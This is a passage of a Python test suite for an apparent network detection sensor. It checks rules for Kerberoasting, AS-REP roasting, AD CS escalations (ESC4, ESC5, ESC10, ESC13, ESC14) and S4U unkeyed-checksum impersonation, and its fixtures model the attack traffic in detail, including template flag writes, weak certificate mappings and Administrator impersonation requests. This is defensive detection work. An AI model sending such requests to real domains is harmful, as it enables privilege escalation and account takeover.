    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         config=_kcfg(kdc_nets=list(KDC1), krb_enum_window=0.001),
                         ldap_steps=spn_search)
    h.check("krb R2 gate: outside the correlation window, silent",
            "LDAP-KRB-SPN-ENUM-THEN-ROAST" not in codes)

    # R3 the options artifact
    _, codes = h.run_krb([("c2s", tgs_req(SQL))])
    h.check("krb R3: canonicalize-clear user SPN flagged",
            "LDAP-KRB-ROAST-OPTIONS" in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL, opts=KDCOPT_WINDOWS))])
    h.check("krb R3 gate: Windows shape (canonicalize set) silent",
            "LDAP-KRB-ROAST-OPTIONS" not in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         config=_kcfg(krb_native_nets=[ipaddress.ip_network("10.10.0.5/32")]))
    h.check("krb R3 gate: --krb-native-client allowlist suppresses",
            "LDAP-KRB-ROAST-OPTIONS" not in codes)
    # non-roastable targets: a trailing '$', krbtgt, and computer service classes
    for label, sname in (("machine account $", ["DC1$"]),
                         ("krbtgt referral", ["krbtgt", "OTHER.LOCAL"]),
                         ("HOST/ class", ["HOST", "dc1.corp.local"]),
                         ("cifs/ class", ["cifs", "fs1.corp.local"]),
                         ("GC/ class", ["GC", "dc1.corp.local"])):
        _, codes = h.run_krb([("c2s", tgs_req(sname))])
        h.check(f"krb R3 gate: {label} not roastable",
                "LDAP-KRB-ROAST-OPTIONS" not in codes)

    # R4 AS-REP roasting -- decided on the REPLY, not the request.
    _, codes = h.run_krb([("c2s", as_req(padata=[L.PA_PAC_REQUEST])),
                          ("s2c", as_rep())])
    h.check("krb R4: AS-REP to a pre-auth-less AS-REQ flagged",
            "LDAP-KRB-ASREP-ROASTABLE" in codes)
    # THE decisive negative: the ORDINARY Kerberos flow begins with a
    # pre-auth-less AS-REQ answered by KRB-ERROR 25, then retries WITH
    # PA-ENC-TIMESTAMP. A rule keyed on the request alone fires on every
    # normal logon on the network; this must stay silent.
    _, codes = h.run_krb([("c2s", as_req(padata=[L.PA_PAC_REQUEST])),
                          ("s2c", krb_error(L.KDC_ERR_PREAUTH_REQUIRED)),
                          ("c2s", as_req(padata=[L.PA_ENC_TIMESTAMP, L.PA_PAC_REQUEST])),
                          ("s2c", as_rep())])
    h.check("krb R4 gate: ordinary pre-auth-required logon flow is silent",
            "LDAP-KRB-ASREP-ROASTABLE" not in codes)
    h.check("krb: KDC_ERR_PREAUTH_REQUIRED is 25", L.KDC_ERR_PREAUTH_REQUIRED == 25)
    # a pre-auth-less AS-REQ with no reply observed is not a finding on its own
    _, codes = h.run_krb([("c2s", as_req(padata=[L.PA_PAC_REQUEST]))])
    h.check("krb R4 gate: request alone, with no AS-REP, silent",
            "LDAP-KRB-ASREP-ROASTABLE" not in codes)
    # a properly pre-authenticated logon is silent
    _, codes = h.run_krb([("c2s", as_req(padata=[L.PA_ENC_TIMESTAMP])),
                          ("s2c", as_rep())])
    h.check("krb R4 gate: pre-authenticated AS-REQ silent",
            "LDAP-KRB-ASREP-ROASTABLE" not in codes)

    # R5 etype posture, deliberately demoted and NOT the roasting rule
    _, codes = h.run_krb([("c2s", tgs_req(SQL, etypes=[23, 18]))])
    h.check("krb R5: RC4 offered for a user SPN flagged", "LDAP-KRB-RC4-REQUESTED" in codes)
    h.check("krb R5: severity is medium, below the roasting rules",
            L.FINDINGS["LDAP-KRB-RC4-REQUESTED"][0] == "medium")
    _, codes = h.run_krb([("c2s", tgs_req(SQL, etypes=[18, 17]))])
    h.check("krb R5 gate: AES-only request silent", "LDAP-KRB-RC4-REQUESTED" not in codes)
    # AES roasting is reachable only through options/honeytoken, never etype
    recs, codes = h.run_krb([("c2s", tgs_req(SQL, etypes=[18]))])
    h.check("krb: AES roasting still caught via the options artifact",
            "LDAP-KRB-ROAST-OPTIONS" in codes and "LDAP-KRB-RC4-REQUESTED" not in codes)

    # ====================== AD CS escalation tier ========================= #
    CFG_NC = "CN=Services,CN=Configuration,DC=corp,DC=local"
    TPL = f"CN=UserAuth,CN=Certificate Templates,CN=Public Key Services,{CFG_NC}"
    NTAUTH = f"CN=NTAuthCertificates,CN=Public Key Services,{CFG_NC}"
    AIA = f"CN=corp-CA,CN=AIA,CN=Public Key Services,{CFG_NC}"
    CDP = f"CN=corp-CA,CN=CDP,CN=Public Key Services,{CFG_NC}"
    ENROLLSVC = f"CN=corp-CA,CN=Enrollment Services,CN=Public Key Services,{CFG_NC}"
    PKSVC = f"CN=Public Key Services,{CFG_NC}"
    OIDOBJ = f"CN=1.2.3.4,CN=OID,CN=Public Key Services,{CFG_NC}"
    USER = "CN=victim,CN=Users,DC=corp,DC=local"
    ADMIN = "CN=Administrator,CN=Users,DC=corp,DC=local"
    E4 = "LDAP-ADCS-ESC4-TEMPLATE-WRITE"
    E5 = "LDAP-ADCS-ESC5-PKI-OBJECT-WRITE"
    E13 = "LDAP-ADCS-ESC13-OID-GROUP-LINK"
    E14 = "LDAP-ADCS-ESC14-WEAK-ALT-SEC-ID"
    E10 = "LDAP-ADCS-ESC10-UPN-SWAP"

    def mod(dn, *changes, mid=2):
        return ldap_message(mid, modify_request(dn, changes))

    def esc_run(dn, *changes, config=None):
        return h.run([("c2s", mod(dn, *changes))], config=config)

    # ---- the parser extension this whole tier rests on ------------------- #
    pm = L.dissect_message(mod(TPL, ("replace", "msPKI-Certificate-Name-Flag", ["1"]),
                               ("add", "pKIExtendedKeyUsage", ["1.3.6.1.5.5.7.3.2"])))
    h.check("ADCS parser: modify changes are dissected, not just the target",
            len(pm.op["changes"]) == 2 and pm.op["target"] == TPL)
    h.check("ADCS parser: change operations are decoded",
            [c["op"] for c in pm.op["changes"]] == ["replace", "add"])
    h.check("ADCS parser: attribute names are lowercased (RFC 4512 case-insensitivity)",
            pm.op["attrs"] == {"mspki-certificate-name-flag", "pkiextendedkeyusage"})
    h.check("ADCS parser: values are retained with their true length",
            pm.op["changes"][0]["vals"][0]["val"] == b"1"
            and pm.op["changes"][0]["vals"][0]["len"] == 1)
    pa = L.dissect_message(ldap_message(3, add_request(TPL, [
        ("objectClass", ["top", "pKICertificateTemplate"]),
        ("msPKI-Enrollment-Flag", ["0"])])))
    h.check("ADCS parser: addRequest normalises into the same changes shape",
            all(c["op"] == "add" for c in pa.op["changes"])
            and pa.op["attrs"] == {"objectclass", "mspki-enrollment-flag"})
    big = L.dissect_message(mod(NTAUTH, ("replace", "cACertificate", [b"\xAA" * 70000])))
    v = big.op["changes"][0]["vals"][0]
    h.check("ADCS parser: a 70 KB value is bounded but its real length kept",
            len(v["val"]) == L._MAX_ATTR_VALUE and v["len"] == 70000 and v["truncated"])
    h.check("ADCS parser: change count is capped",
            len(L.dissect_message(mod(USER, *[("add", f"attr{i}", ["x"])
                                              for i in range(200)])).op["changes"])
            == L._MAX_MOD_CHANGES)
    # A DN comparison must survive AD's spacing and arbitrary case.
    h.check("ADCS DN match: case- and space-insensitive, suffix-relative",
            L.dn_in("cn=x,CN=Certificate Templates, CN=Public Key Services,CN=X",
                    L.PKI_TEMPLATES_RDN)
            and not L.dn_in("CN=x,CN=Users,DC=corp,DC=local", L.PKI_TEMPLATES_RDN))

    # ---- ESC4 ------------------------------------------------------------- #
    recs, codes = esc_run(TPL, ("replace", "msPKI-Certificate-Name-Flag", ["1"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: a name-flag write on a template fires", bool(d))
    h.check("ESC4: ENROLLEE_SUPPLIES_SUBJECT is decoded from the decimal string",
            bool(d) and d[0]["detail"]["enrollee_supplies_subject"] is True
            and "ESC1 conversion" in d[0]["detail"]["note_name_flag"])
    h.check("ESC4: a flag write is graded as the conversion stage",
            bool(d) and d[0]["detail"]["stage"] == "conversion")
    # The real-world combined value: ESS + SUBJECT_ALT_REQUIRE_UPN.
    recs, _ = esc_run(TPL, ("replace", "msPKI-Certificate-Name-Flag", ["33554433"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: a combined name-flag word decodes both bits",
            bool(d) and d[0]["detail"]["enrollee_supplies_subject"] is True
            and d[0]["detail"]["subject_alt_require_upn"] is True)
    recs, _ = esc_run(TPL, ("replace", "msPKI-Enrollment-Flag", ["0"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: PEND_ALL_REQUESTS cleared is reported as no manager approval",
            bool(d) and d[0]["detail"]["pend_all_requests"] is False
            and "manager approval" in d[0]["detail"]["note_enrollment_flag"])
    # LITERAL wire values from MS-CRTD, never str(L.CT_FLAG_*). A fixture built
    # from the constant under test is self-consistent and therefore blind to a
    # wrong constant -- a mutation setting PEND_ALL_REQUESTS to 0x1 survived
    # until these were switched to literals.
    #   2       = PEND_ALL_REQUESTS
    #   8       = PUBLISH_TO_DS only (PEND clear)
    #   524290  = 0x00080002 = PEND_ALL_REQUESTS | NO_SECURITY_EXTENSION
    #   524288  = 0x00080000 = NO_SECURITY_EXTENSION only
    recs, _ = esc_run(TPL, ("replace", "msPKI-Enrollment-Flag", ["2"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: literal 2 reads as PEND_ALL_REQUESTS set, no approval note",
            bool(d) and d[0]["detail"]["pend_all_requests"] is True
            and "note_enrollment_flag" not in d[0]["detail"])
    recs, _ = esc_run(TPL, ("replace", "msPKI-Enrollment-Flag", ["8"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: literal 8 (PUBLISH_TO_DS) leaves PEND_ALL_REQUESTS clear",
            bool(d) and d[0]["detail"]["pend_all_requests"] is False
            and d[0]["detail"]["no_security_extension"] is False)
    recs, _ = esc_run(TPL, ("replace", "msPKI-Enrollment-Flag", ["524290"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: literal 524290 decodes PEND_ALL_REQUESTS and NO_SECURITY_EXTENSION",
            bool(d) and d[0]["detail"]["pend_all_requests"] is True
            and d[0]["detail"]["no_security_extension"] is True)
    recs, _ = esc_run(TPL, ("replace", "msPKI-Enrollment-Flag", ["524288"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: literal 524288 is NO_SECURITY_EXTENSION with approval removed",
            bool(d) and d[0]["detail"]["no_security_extension"] is True
            and d[0]["detail"]["pend_all_requests"] is False)
    # The constants themselves, against the MS-CRTD literals, so a wrong value
    # fails here as well as through behaviour.
    h.check("ESC4 constants: MS-CRTD literals",
            (L.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, L.CT_FLAG_PEND_ALL_REQUESTS,
             L.CT_FLAG_SUBJECT_ALT_REQUIRE_UPN, L.CT_FLAG_NO_SECURITY_EXTENSION)
            == (0x00000001, 0x00000002, 0x02000000, 0x00080000))
    recs, _ = esc_run(TPL, ("replace", "msPKI-RA-Signature", ["0"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: msPKI-RA-Signature 0 is reported",
            bool(d) and d[0]["detail"]["ra_signature"] == 0
            and "authorized signature" in d[0]["detail"]["note_ra_signature"])
    recs, _ = esc_run(TPL, ("replace", "nTSecurityDescriptor", [b"\x01\x00\x04\x80"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: an ACL write grades as the ENABLING stage, not the conversion",
            bool(d) and d[0]["detail"]["stage"] == "enabling")
    recs, _ = esc_run(TPL, ("add", "pKIExtendedKeyUsage", ["1.3.6.1.5.5.7.3.2"]))
    d = [r for r in recs if r["finding"] == E4]
    h.check("ESC4: an added client-auth EKU is reported with its OID",
            bool(d) and d[0]["detail"]["ekus_written"] == ["1.3.6.1.5.5.7.3.2"])
    # Creating a rogue template is the same attack as modifying one.
    _, codes = h.run([("c2s", ldap_message(4, add_request(
        "CN=Rogue,CN=Users,DC=corp,DC=local",
        [("objectClass", ["top", "pKICertificateTemplate"]),
         ("msPKI-Certificate-Name-Flag", ["1"])])))])
    h.check("ESC4: objectClass identifies a template created OUTSIDE the container",
            E4 in codes)
    # Gates.
    h.check("ESC4 gate: an unrelated attribute on a template is silent",
            E4 not in esc_run(TPL, ("replace", "displayName", ["x"]))[1])
    h.check("ESC4 gate: the same attribute on a NON-template object is silent",
            E4 not in esc_run(USER, ("replace", "msPKI-Certificate-Name-Flag", ["1"]))[1])
    h.check("ESC4 gate: a name-flag that will not parse still reports the write",
            E4 in esc_run(TPL, ("replace", "msPKI-Certificate-Name-Flag",
                                [b"\xff\xfe"]))[1])
    recs, _ = esc_run(TPL, ("replace", "msPKI-Certificate-Name-Flag", [b"\xff\xfe"]))
    h.check("ESC4: an unparseable flag is NOT given an invented value",
            "name_flag" not in [r for r in recs if r["finding"] == E4][0]["detail"])

    # ---- ESC5 ------------------------------------------------------------- #
    for dn, label in ((NTAUTH, "NTAuthCertificates"), (AIA, "AIA"), (CDP, "CDP"),
                      (ENROLLSVC, "Enrollment Services"), (PKSVC, "Public Key Services")):
        _, codes = esc_run(dn, ("replace", "nTSecurityDescriptor", [b"\x01\x00"]))
        h.check(f"ESC5: an ACL write on {label} fires", E5 in codes)
    recs, _ = esc_run(NTAUTH, ("add", "cACertificate", [b"\x30\x82\x03\x00FAKE"]))
    d = [r for r in recs if r["finding"] == E5]
    h.check("ESC5: planting a cACertificate is flagged as the END STATE",
            bool(d) and d[0]["detail"]["ca_cert_planted"] is True
            and "END STATE" in d[0]["detail"]["note_ca_cert"])
    _, codes = esc_run(ENROLLSVC, ("add", "crossCertificatePair", [b"\x30\x06"]))
    h.check("ESC5: crossCertificatePair is covered too", E5 in codes)
    _, codes = h.run([("c2s", ldap_message(5, add_request(
        "CN=RogueCA,CN=Users,DC=corp,DC=local",
        [("objectClass", ["top", "pKIEnrollmentService"]),
         ("cACertificate", [b"\x30\x06"])])))])
    h.check("ESC5: objectClass identifies a CA object outside the container", E5 in codes)
    h.check("ESC5 gate: an unrelated attribute on a trust object is silent",
            E5 not in esc_run(NTAUTH, ("replace", "description", ["x"]))[1])
    h.check("ESC5 gate: a template write is ESC4 and NOT also ESC5",
            E5 not in esc_run(TPL, ("replace", "nTSecurityDescriptor", [b"\x01"]))[1])
    h.check("ESC5 gate: an OID-container write is not ESC5",
            E5 not in esc_run(OIDOBJ, ("replace", "nTSecurityDescriptor", [b"\x01"]))[1])

    # ---- ESC13 ------------------------------------------------------------ #
    GRP = "CN=Domain Admins,CN=Users,DC=corp,DC=local"
    recs, codes = esc_run(OIDOBJ, ("replace", "msDS-OIDToGroupLink", [GRP]))
    d = [r for r in recs if r["finding"] == E13]
    h.check("ESC13: an OID-to-group link write fires", bool(d))
    h.check("ESC13: the linked group DN is reported, not inferred",
            bool(d) and d[0]["detail"]["linked_groups"] == [GRP]
            and d[0]["detail"]["stage"] == "group-link")
    recs, _ = esc_run(TPL, ("add", "msPKI-Certificate-Policy", ["1.2.3.4"]))
    d = [r for r in recs if r["finding"] == E13]
    h.check("ESC13: the template policy half fires and is marked as such",
            bool(d) and d[0]["detail"]["stage"] == "policy-reference"
            and d[0]["detail"]["policies"] == ["1.2.3.4"])
    h.check("ESC13: the policy half says it is only an escalation with a link",
            bool(d) and "only an escalation if" in d[0]["detail"]["note"])
    h.check("ESC13 gate: a certificate policy on a NON-template is silent",
            E13 not in esc_run(USER, ("add", "msPKI-Certificate-Policy", ["1.2.3.4"]))[1])

    # ---- ESC14 ------------------------------------------------------------ #
    for val, mapping in (("X509:<I>CN=corp-CA<S>CN=victim", "X509IssuerSubject"),
                         ("X509:<S>CN=victim", "X509SubjectOnly"),
                         ("X509:<RFC822>victim@corp.local", "X509RFC822")):
        recs, codes = esc_run(USER, ("add", "altSecurityIdentities", [val]))
        d = [r for r in recs if r["finding"] == E14]
        h.check(f"ESC14: weak mapping {mapping} is critical",
                bool(d) and d[0]["severity"] == "critical"
                and d[0]["detail"]["mappings"][0] == {"mapping": mapping,
                                                      "strength": "weak"})
    for val, mapping in (("X509:<I>CN=corp-CA<SR>0a0b", "X509IssuerSerialNumber"),
                         ("X509:<SKI>aabbcc", "X509SKI"),
                         ("X509:<SHA1-PUKEY>ddeeff", "X509SHA1PublicKey")):
        recs, codes = esc_run(USER, ("add", "altSecurityIdentities", [val]))
        d = [r for r in recs if r["finding"] == E14]
        h.check(f"ESC14: strong mapping {mapping} grades DOWN to high, not silent",
                bool(d) and d[0]["severity"] == "high"
                and d[0]["detail"]["mappings"][0]["strength"] == "strong")
    # The ONE ordering dependency that is real, verified by substring:
    # "<s>" IS inside an IssuerSubject value but is NOT inside "<sr>".
    h.check("ESC14 substring fact: <s> is in an IssuerSubject value",
            "<s>" in "x509:<i>cn=ca<s>cn=victim")
    h.check("ESC14 substring fact: <s> is NOT in an IssuerSerialNumber value",
            "<s>" not in "x509:<i>cn=ca<sr>0a0b")
    # ...so SubjectOnly must not win on an IssuerSubject value. Both are weak,
    # so only the MAPPING NAME reveals a mis-ordering -- severity cannot.
    h.check("ESC14: IssuerSubject is not mislabelled SubjectOnly (order matters)",
            L.classify_altsecid(b"X509:<I>CN=CA<S>CN=victim")[0] == "X509IssuerSubject")
    h.check("ESC14: SubjectOnly is still matched when <I> is absent",
            L.classify_altsecid(b"X509:<S>CN=victim")[0] == "X509SubjectOnly")
    h.check("ESC14: IssuerSerialNumber is graded strong",
            L.classify_altsecid(b"X509:<I>CN=CA<SR>01") ==
            ("X509IssuerSerialNumber", "strong"))
    recs, _ = esc_run(USER, ("add", "altSecurityIdentities", ["X509:<SKI>aabbcc"]))
    d = [r for r in recs if r["finding"] == E14]
    h.check("ESC14: SKI carries the dispute on the record",
            bool(d) and "disputed" in d[0]["detail"]
            and "CVE-2025-26647 did not" in d[0]["detail"]["disputed"])
    # Unclassifiable forms must be reported, never graded.
    for val, label in (("Kerberos:victim@CORP.LOCAL", "non-X509 (Kerberos)"),
                       ("X509:<PublicKeyOnly>zz", "unrecognised X509 form")):
        recs, _ = esc_run(USER, ("add", "altSecurityIdentities", [val]))
        d = [r for r in recs if r["finding"] == E14]
        h.check(f"ESC14: {label} is reported ungraded with its raw value",
                bool(d) and d[0]["detail"]["ungraded_mappings"] == [label]
                and d[0]["detail"]["values"] == [val])
    h.check("ESC14: no strength is asserted for an undocumented mapping form",
            all(st is None for _, st in
                [L.classify_altsecid(b"X509:<PublicKeyOnly>z"),
                 L.classify_altsecid(b"X509:<NSubjectOnly>z")]))
    # A weak value alongside a strong one must still be critical.
    recs, _ = esc_run(USER, ("add", "altSecurityIdentities",
                             ["X509:<SKI>aa", "X509:<S>CN=victim"]))
    d = [r for r in recs if r["finding"] == E14]
    h.check("ESC14: a weak value among strong ones still reaches critical",
            bool(d) and d[0]["severity"] == "critical")
    cfgp = L.Config(); cfgp.protected_users = {"administrator"}
    recs, _ = esc_run(ADMIN, ("add", "altSecurityIdentities", ["X509:<SKI>aa"]),
                      config=cfgp)
    d = [r for r in recs if r["finding"] == E14]
    h.check("ESC14: --protected-user escalates a STRONG mapping to critical",
            bool(d) and d[0]["severity"] == "critical"
            and d[0]["detail"]["protected_user"] is True)
    h.check("ESC14 gate: an unrelated write on a user object is silent",
            E14 not in esc_run(USER, ("replace", "description", ["x"]))[1])

    # ---- ESC10 ------------------------------------------------------------ #
    recs, codes = esc_run(USER, ("replace", "userPrincipalName", ["newname@corp.local"]))
    d = [r for r in recs if r["finding"] == E10]
    h.check("ESC10: a lone UPN write fires at MEDIUM, not high", 
            bool(d) and d[0]["severity"] == "medium"
            and d[0]["detail"]["pattern"] == "single-write")
    h.check("ESC10: the medium grade explains itself as unmeasurable",
            bool(d) and "no-pattern" in d[0]["detail"]["confidence"]
            and "site-specific" in d[0]["detail"]["confidence"])
    # swap-and-revert: the signature.
    recs, codes = h.run([
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["victim@corp.local"]), mid=2)),
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["admin@corp.local"]), mid=3)),
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["victim@corp.local"]), mid=4))])
    d = [r for r in recs if r["finding"] == E10]
    h.check("ESC10: swap-and-revert is detected", len(d) == 3
            and d[2]["severity"] == "critical"
            and d[2]["detail"]["pattern"] == "swap-and-revert")
    h.check("ESC10: the restored value and the elapsed time are reported",
            len(d) == 3 and d[2]["detail"]["reverted_to"] == "victim@corp.local"
            and d[2]["detail"]["seconds_since_prior"] > 0)
    h.check("ESC10: the first two writes of the swap are NOT yet critical",
            len(d) == 3 and d[0]["severity"] == "medium"
            and d[1]["severity"] == "medium")
    # Outside the window it is no longer a swap.
    cfg0 = L.Config(); cfg0.adcs_upn_swap_window = 0.0
    recs, _ = h.run([
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["victim@corp.local"]), mid=2)),
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["admin@corp.local"]), mid=3)),
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["victim@corp.local"]), mid=4))],
        config=cfg0)
    d = [r for r in recs if r["finding"] == E10]
    h.check("ESC10 gate: outside the window a revert is not called a swap",
            len(d) == 3 and all(r["detail"]["pattern"] == "single-write" for r in d))
    # Collision with a UPN the sensor saw being READ -- the baseline an attacker
    # never writes.
    recs, codes = h.run([
        ("s2c", ldap_message(1, search_result_entry_attrs(
            ADMIN, {"userPrincipalName": [b"admin@corp.local"]}))),
        ("c2s", mod(USER, ("replace", "userPrincipalName", ["admin@corp.local"]), mid=2))])
    d = [r for r in recs if r["finding"] == E10]
    h.check("ESC10: a UPN collision with a READ principal is critical",
            bool(d) and d[0]["severity"] == "critical"
            and d[0]["detail"]["pattern"] == "upn-collision")
    h.check("ESC10: the colliding object's DN is named",
            bool(d) and d[0]["detail"]["collides_with_dn"] == ADMIN)
    h.check("ESC10 gate: re-writing an object's OWN UPN is not a collision",
            [r for r in h.run([
                ("s2c", ldap_message(1, search_result_entry_attrs(
                    USER, {"userPrincipalName": [b"victim@corp.local"]}))),
                ("c2s", mod(USER, ("replace", "userPrincipalName",
                                   ["victim@corp.local"]), mid=2))])[0]
             if r["finding"] == E10][0]["detail"]["pattern"] == "single-write")
    cfgp2 = L.Config(); cfgp2.protected_users = {"administrator"}
    recs, _ = esc_run(ADMIN, ("replace", "userPrincipalName", ["x@corp.local"]),
                      config=cfgp2)
    d = [r for r in recs if r["finding"] == E10]
    h.check("ESC10: --protected-user escalates a lone UPN write to critical",
            bool(d) and d[0]["severity"] == "critical")
    h.check("ESC10 gate: a non-UPN write on a user is silent",
            E10 not in esc_run(USER, ("replace", "description", ["x"]))[1])

    # ---- dual-stack parity for the whole tier ----------------------------- #
    ESC_ALL = [E4, E5, E13, E14, E10]
    for fam, cip, sip in (("ipv4", "10.10.0.5", "10.10.0.10"),
                          ("ipv6", "2001:db8::5", "2001:db8::10")):
        recs, codes = h.run([
            ("c2s", mod(TPL, ("replace", "msPKI-Certificate-Name-Flag", ["1"]), mid=2)),
            ("c2s", mod(NTAUTH, ("replace", "nTSecurityDescriptor", [b"\x01"]), mid=3)),
            ("c2s", mod(OIDOBJ, ("replace", "msDS-OIDToGroupLink", [GRP]), mid=4)),
            ("c2s", mod(USER, ("add", "altSecurityIdentities",
                               ["X509:<S>CN=victim"]), mid=5)),
            ("c2s", mod(USER, ("replace", "userPrincipalName", ["n@corp.local"]), mid=6)),
        ], client_ip=cip, server_ip=sip)
        h.check(f"ADCS dual-stack: all five ESC codes fire over {fam}",
                all(c in codes for c in ESC_ALL))
        # LDAP-plane records carry the addresses at the top level (the Kerberos
        # plane is the one with detail.af), so parity is asserted on those.
        h.check(f"ADCS dual-stack: {fam} addresses round-trip onto every ESC record",
                all(r["src"] == cip and r["dst"] == sip
                    and ((":" in r["src"]) == (fam == "ipv6"))
                    for r in recs if r["finding"] in ESC_ALL))
    # The tier keys on DN and attribute name only, so parity is structural:
    # prove the two families produce IDENTICAL verdicts, not merely both non-empty.
    def _esc_codes(cip, sip):
        return sorted(h.run([
            ("c2s", mod(TPL, ("replace", "msPKI-Enrollment-Flag", ["0"]), mid=2)),
            ("c2s", mod(USER, ("add", "altSecurityIdentities",
                               ["X509:<RFC822>a@b"]), mid=3))],
            client_ip=cip, server_ip=sip)[1])
    h.check("ADCS dual-stack: IPv4 and IPv6 yield identical verdicts",
            _esc_codes("10.10.0.5", "10.10.0.10") ==
            _esc_codes("2001:db8::5", "2001:db8::10"))

    # ---- readability precondition ---------------------------------------- #
    # The tier reads attribute VALUES, so it only works on an unsealed session.
    # Under TLS there is nothing to parse at all -- not even that a write
    # happened -- which is a fact about the tier's reach, asserted here.
    _, codes = h.run([("c2s", mod(TPL, ("replace", "msPKI-Certificate-Name-Flag",
                                        ["1"]), mid=2))], cleartext=False)
    h.check("ADCS reach: on the LDAPS port the tier sees nothing to parse",
            E4 not in codes)

    # ================= S4U delegation plane / CVE-2025-60704 ============== #
    # Fixtures use the WINDOWS options shape so the canonicalize artifact rule
    # stays quiet and each check isolates the rule it names.
    KDCOPT_S4U2PROXY = kdc_options(L.KDCOPT_FORWARDABLE, L.KDCOPT_RENEWABLE,
                                   L.KDCOPT_CANONICALIZE, L.KDCOPT_CNAME_IN_ADDL_TKT)
    WEB = ("http", "web1.corp.local")
    DCL = ("ldap", "dc1.corp.local")
    FS = ("cifs", "fs1.corp.local")
    S4U_X509 = "LDAP-KRB-S4U-X509-UNKEYED-CKSUM"
    S4U_RC4 = "LDAP-KRB-S4U-RC4-DOWNGRADE"
    S4U_SELF = "LDAP-KRB-S4U2SELF-IMPERSONATION"
    S4U_PROXY = "LDAP-KRB-S4U2PROXY-DELEGATION"

    def s4u_req(padata, *, spn=WEB, opts=KDCOPT_WINDOWS, etypes=(18,), addl=0, nonce=12345):
        return tgs_req(spn, opts=opts, etypes=etypes, padata=padata,
                       addl_tickets=addl, nonce=nonce)

    h.check("S4U: bit 14 derived mask is 0x00020000",
            L.kdcopt_mask(L.KDCOPT_CNAME_IN_ADDL_TKT) == 0x00020000)
    h.check("S4U: padata numbers are 129/130",
            (L.PA_FOR_USER, L.PA_S4U_X509_USER) == (129, 130))

    # ---- R1: CVE-2025-60704, keyed on the CHECKSUM TYPE ------------------- #
    for ck, nm in ((L.CKSUM_CRC32, "CRC32"), (L.CKSUM_RSA_MD4, "rsa-md4"),
                   (L.CKSUM_RSA_MD5, "rsa-md5"), (L.CKSUM_SHA1_10, "sha1-10"),
                   (L.CKSUM_SHA1_14, "sha1-14")):
        recs, codes = h.run_krb([("c2s", s4u_req(
            [(L.PA_S4U_X509_USER, pa_s4u_x509_user(cksumtype=ck))]))])
        h.check(f"S4U R1: unkeyed cksum {nm} ({ck}) fires", S4U_X509 in codes)
        d = [r for r in recs if r["finding"] == S4U_X509]
        h.check(f"S4U R1: {nm} reports the asserted principal",
                bool(d) and d[0]["detail"]["asserted_name"] == "victim"
                and d[0]["detail"]["cksumtype"] == ck)

    # Every KEYED type must be silent -- this is the rule's whole precision.
    for ck, nm in ((L.CKSUM_HMAC_MD5, "KERB_CHECKSUM_HMAC_MD5"),
                   (L.CKSUM_HMAC_SHA1_96_AES128, "aes128"),
                   (L.CKSUM_HMAC_SHA1_96_AES256, "aes256"),
                   (L.CKSUM_DES_MAC, "des-mac"),
                   (L.CKSUM_RSA_MD4_DES, "rsa-md4-des"),
                   (L.CKSUM_RSA_MD5_DES3, "rsa-md5-des3"),
                   (L.CKSUM_HMAC_SHA1_DES3_KD, "hmac-sha1-des3-kd")):
        _, codes = h.run_krb([("c2s", s4u_req(
            [(L.PA_S4U_X509_USER, pa_s4u_x509_user(cksumtype=ck))]))])
        h.check(f"S4U R1 gate: keyed cksum {nm} silent", S4U_X509 not in codes)

    # IANA says 4 = des-mac, impacket says rsa_md4_des. Either label is KEYED,
    # so the mislabel must not be able to change the verdict for 4.
    h.check("S4U R1: 4 is keyed under BOTH labels (IANA des-mac / impacket rsa_md4_des)",
            4 not in L._UNKEYED_CKSUMS)
    h.check("S4U R1: the unkeyed set is exactly the derived five",
            set(L._UNKEYED_CKSUMS) == {1, 2, 7, 10, 14})
    h.check("S4U R1: -138 is not in the unkeyed set", L.CKSUM_HMAC_MD5 not in L._UNKEYED_CKSUMS)

    # Legitimate certificate-based S4U: padata 130 present, cert supplied, no
    # cname, KEYED checksum. Presence alone must never be the trigger.
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_S4U_X509_USER, pa_s4u_x509_user(
        name="", cert=True, cksumtype=L.CKSUM_HMAC_SHA1_96_AES256))]))])
    h.check("S4U R1 gate: legitimate cert-based S4U (keyed, no cname) silent",
            S4U_X509 not in codes and S4U_SELF not in codes)
    recs, codes = h.run_krb([("c2s", s4u_req([(L.PA_S4U_X509_USER, pa_s4u_x509_user(
        cert=True, cksumtype=L.CKSUM_RSA_MD4))]))])
    d = [r for r in recs if r["finding"] == S4U_X509]
    h.check("S4U R1: a certificate present is reported, not exculpatory",
            bool(d) and d[0]["detail"]["subject_certificate_present"] is True)

    # The exploit shape: 129 and 130 together. The KDC prefers 130, so the
    # reported identity must come from 130.
    recs, codes = h.run_krb([("c2s", s4u_req([
        (L.PA_FOR_USER, pa_for_user(name="alice")),
        (L.PA_S4U_X509_USER, pa_s4u_x509_user(name="Administrator",
                                              cksumtype=L.CKSUM_RSA_MD4))]))])
    d = [r for r in recs if r["finding"] == S4U_X509]
    h.check("S4U R1: 129+130 together fires", bool(d))
    h.check("S4U R1: coexistence is recorded",
            bool(d) and d[0]["detail"]["for_user_also_present"] is True)
    sd = [r for r in recs if r["finding"] == S4U_SELF]
    h.check("S4U R1: 130 identity wins over 129 (the substitution the CVE performs)",
            bool(sd) and sd[0]["detail"]["impersonated"] == "Administrator"
            and sd[0]["detail"]["asserted_via"] == "PA-S4U-X509-USER")

    # An undecodable 130 must not be read as a checksum type.
    _, codes = h.run_krb([("c2s", s4u_req([(L.PA_S4U_X509_USER, b"\x04\x02ab")]))])
